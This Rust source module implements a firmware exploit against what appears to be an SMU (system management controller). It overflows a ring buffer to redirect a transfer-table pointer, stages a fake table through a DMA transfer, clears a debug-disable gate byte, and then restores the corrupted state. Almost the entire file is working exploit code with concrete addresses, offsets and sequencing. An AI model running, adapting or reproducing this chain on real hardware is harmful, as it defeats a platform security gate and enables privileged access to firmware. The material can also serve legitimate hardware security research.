//! The unlock sequence, which overruns a ring buffer to point the
//! transfer-table pointer at a chosen address, uses the transfer
//! engine to stage a fake table, and then clears the debug gate byte
//! at 0x7B3C. Two typestates mark the gate as closed or open so that
//! only the messages that work in each state are reachable.

use crate::error::Error;
use crate::mailbox::SMU_RETURN_REJECTED_PREREQ;
use crate::page::PinnedPage;
use crate::smu::Smu;

const DBG_DISABLE_ADDR: u32 = 0x7B3C;
const PROBE_ADDR: u32 = 0x5A870;

// Ring-buffer geometry used by the overflow primitive.
const RING_BASE: u32 = 0x18850;
const RING_ENTRY_SZ: u32 = 16;
const RING_SUBQ_SLOTS: u32 = 30;

// Transfer-table staging addresses.
const TR_TABLE_PTR: u32 = 0x19784;
const TR_TABLE_ENTRY_HDR_SZ: u32 = 4;
const TR_TABLE_FAKE_RING_ENTRY: u32 = TR_TABLE_PTR - 4;
const FAKE_ENTRY_KEY: u16 = 0x13;
const NEW_ENTRY_KEY: u32 = 0x37;
const NEW_ENTRY_ADDR: u32 = DBG_DISABLE_ADDR - TR_TABLE_ENTRY_HDR_SZ;

// Search bounds for the zero region that hosts the fake transfer
// table. The loop starts at SEARCH_START, stops before SEARCH_STOP,
// and probes SEARCH_INNER_START downward while the probe stays at or
// above max(SEARCH_INNER_FLOOR, outer position + 0x1C).
const SEARCH_START: u32 = DBG_DISABLE_ADDR - 72;
const SEARCH_STOP: u32 = 0x3054 - 72;
const SEARCH_STEP: u32 = 72;
const SEARCH_INNER_START: u32 = 0x7B1C;
const SEARCH_INNER_STEP: u32 = 4;
const SEARCH_INNER_FLOOR: u32 = 0x3070;

fn ring_cmd_type(cmd: u32, subq: u32) -> u32 {
    (cmd << 24) | subq
}

/// The SMU before the debug gate is opened. Only the messages that
/// work without the gate are available on this type.
pub(crate) struct LockedSmu {
    smu: Smu,
    // How many slots of ring subqueue 4 have been consumed by
    // previous overflow calls. A second overflow must start where
    // the first stopped, not from slot 0.
    subq4_cur_idx: u32,
}

/// The SMU after the debug gate is opened.
pub(crate) struct UnlockedSmu(Smu);

impl LockedSmu {
    pub(crate) fn open() -> Result<Self, Error> {
        Ok(Self {
            smu: Smu::open()?,
            subq4_cur_idx: 0,
        })
    }

    pub(crate) fn alive(&mut self) -> Result<bool, Error> {
        self.smu.alive()
    }

    pub(crate) fn gate_open(&mut self) -> Result<bool, Error> {
        self.smu.gate_open()
    }

    fn sec_smn_read32(&mut self, addr: u32) -> Result<(u8, u32), Error> {
        self.smu.sec_smn_read32(addr)
    }

    fn read_bytes(&mut self, addr: u32, len: usize) -> Result<Vec<u8>, Error> {
        self.smu.read_bytes(addr, len)
    }

    /// Open the debug gate and return the unlocked SMU. Any state the
    /// sequence disturbed is repaired through the gated path before
    /// the transition completes. If the dbg byte is already zero the
    /// sequence is skipped and no fixups are needed.
    pub(crate) fn unlock(mut self) -> Result<UnlockedSmu, Error> {
        let fixups = unlock_sequence(&mut self)?;
        let mut u = UnlockedSmu(self.smu);

        if !fixups.is_empty() {
            // Zero the staged zone (0x7950..0x799C) and the ring
            // slots and counters (0x18DF0..0x18FE0) used by the
            // unlock sequence.
            u.zero_range(0x7950, 0x4C / 4)?;
            u.zero_range(0x18DF0, 0x1F0 / 4)?;
            for (addr, val) in fixups {
                u.0.write32(addr, val)?;
            }
        }
        Ok(u)
    }

    /// Point the transfer-table pointer at `new_ptr` by overrunning
    /// ring subqueue 4 and writing a single entry to subqueue 0 at
    /// the slot whose index places its payload over TR_TABLE_PTR.
    ///
    /// The first call consumes two slots of subqueue 4, one for the
    /// overrun write and one for the pointer write, so the counter
    /// sits at 2 afterwards. A second call must start from there.
    fn overwrite_tr_table_ptr(&mut self, new_ptr: u32) -> Result<(), Error> {
        let slot = (TR_TABLE_FAKE_RING_ENTRY - RING_BASE) / RING_ENTRY_SZ;
        let n = RING_SUBQ_SLOTS - self.subq4_cur_idx;

        for _ in 0..n {
            self.smu.q2_append(&[0, 0, 0, ring_cmd_type(1, 4), 0, 0])?;
        }
        self.smu
            .q2_append(&[slot, 0, 0, ring_cmd_type(1, 4), 0, 0])?;
        self.smu
            .q2_append(&[0, 0, new_ptr, ring_cmd_type(1, 1), 0, 0])?;
        self.subq4_cur_idx = 2;
        Ok(())
    }
}

impl From<LockedSmu> for UnlockedSmu {
    fn from(locked: LockedSmu) -> Self {
        UnlockedSmu(locked.smu)
    }
}

impl UnlockedSmu {
    pub(crate) fn read_bytes(&mut self, addr: u32, len: usize) -> Result<Vec<u8>, Error> {
        self.0.read_bytes(addr, len)
    }

    pub(crate) fn write_bytes(&mut self, addr: u32, data: &[u8]) -> Result<(), Error> {
        self.0.write_bytes(addr, data)
    }

    fn zero_range(&mut self, addr: u32, words: u32) -> Result<(), Error> {
        for i in 0..words {
            self.0.write32(addr + 4 * i, 0)?;
        }
        Ok(())
    }
}

/// Run the unlock sequence. Returns the state fixups that must be
/// applied through the gated path once the gate is open, or an empty
/// vector if the gate was already open and no fixups are needed.
fn unlock_sequence(smu: &mut LockedSmu) -> Result<Vec<(u32, u32)>, Error> {
    let dbg = smu.read_bytes(DBG_DISABLE_ADDR, 1)?[0];
    let entry = smu.read_bytes(NEW_ENTRY_ADDR, 1)?[0];
    if dbg == 0 {
        return Ok(Vec::new());
    }
    if entry != 0 {
        return Err(Error::Unlock(format!(
            "unexpected byte at entry address: 0x{entry:02X}"
        )));
    }

    let p = find_staging_region(smu)?;
    let n = (0x7B20 - p) / 4;
    if p + 0x18 + 4 * n != NEW_ENTRY_ADDR || n == 0 || n > 0xFFFF {
        return Err(Error::Unlock(format!(
            "staging region at 0x{p:05X} does not fit the target (N={n})"
        )));
    }

    // Build the fake transfer-table header and entry 0 in a pinned
    // page. Entry 0 has size N so a subsequent walk skips it and
    // lands at NEW_ENTRY_ADDR; its data payload goes to the debug
    // gate byte.
    let mut fake = [0u8; 32];
    fake[0..4].copy_from_slice(&1u32.to_le_bytes());
    let e0 = (FAKE_ENTRY_KEY as u32) | (n << 16);
    fake[0x18..0x1C].copy_from_slice(&e0.to_le_bytes());

    let mut page = PinnedPage::new()?;
    page.as_mut_slice()[..32].copy_from_slice(&fake);

    // First pair: point the table at the empty region preceding P so
    // the next allocation lands at P, then transfer the fake table.
    smu.overwrite_tr_table_ptr(p - 0x1C)?;
    smu.smu
        .tr_dram2smu((page.phys >> 32) as u32, page.phys as u32, 8, 3)?;

    // Read back the key-3 slot to DRAM. An SRAM load issued
    // immediately after a DRAM-to-SMU transfer times out.
    smu.smu
        .tr_smu2dram((page.phys >> 32) as u32, page.phys as u32, 8)?;
    let landed = page.as_slice()[..32].to_vec();
    if landed[0] != 1
        || landed[0x18] != FAKE_ENTRY_KEY as u8
        || u16::from_le_bytes([landed[0x1A], landed[0x1B]]) != n as u16
    {
        return Err(Error::Unlock("fake table did not land".into()));
    }

    // Second pair: point the table at P, zero the payload, and
    // transfer one word. The walk skips entry 0 and lands on the
    // debug gate byte, writing a zero word which clears the gate.
    page.as_mut_slice()[..4].fill(0);
    smu.overwrite_tr_table_ptr(p)?;
    smu.smu
        .tr_dram2smu((page.phys >> 32) as u32, page.phys as u32, 1, NEW_ENTRY_KEY)?;

    // Confirm the gate is open and the SMU is still alive.
    let (gst, _) = smu.sec_smn_read32(PROBE_ADDR)?;
    let alive = smu.alive()?;
    if gst == SMU_RETURN_REJECTED_PREREQ || !alive {
        return Err(Error::Unlock(format!(
            "gate not open after staging (probe=0x{gst:02X}, alive={alive})"
        )));
    }

    Ok(vec![
        (0x7B38, 0),
        (0x19780, 0x3F794),
        (0x19784, 0x3E000),
        (0x19788, 0),
        (0x1978C, 0),
        (0x17E1C, 0x8B08),
    ])
}

/// Find the highest address below 0x7B20 whose 60-byte window (0x1C
/// before to 0x20 after) is all zero. The search starts at 0x7B3C
/// and steps down by 72 bytes per iteration.
fn find_staging_region(smu: &mut LockedSmu) -> Result<u32, Error> {
    let mut buf: Vec<u8> = Vec::new();
    let mut a = SEARCH_START;
    while a > SEARCH_STOP {
        let chunk = smu.read_bytes(a, SEARCH_STEP as usize)?;
        // Prepend the new chunk so the buffer stays aligned with the
        // downward search.
        let mut new_buf = Vec::with_capacity(chunk.len() + buf.len());
        new_buf.extend_from_slice(&chunk);
        new_buf.extend_from_slice(&buf);
        buf = new_buf;

        let floor = std::cmp::max(SEARCH_INNER_FLOOR, a + 0x1C);
        let mut c = SEARCH_INNER_START;
        while c >= floor {
            let lo = (c as i64 - 0x1C - a as i64) as usize;
            let hi = (c as i64 + 0x20 - a as i64) as usize;
            if let Some(slice) = buf.get(lo..hi) {
                if slice.iter().all(|&b| b == 0) {
                    return Ok(c);
                }
            }
            c -= SEARCH_INNER_STEP;
        }
        a -= SEARCH_STEP;
    }
    Err(Error::Unlock(format!(
        "no zero region below 0x7B20 (searched 0x{SEARCH_START:05X}..=0x{:05X})",
        SEARCH_STOP + SEARCH_STEP
    )))
}
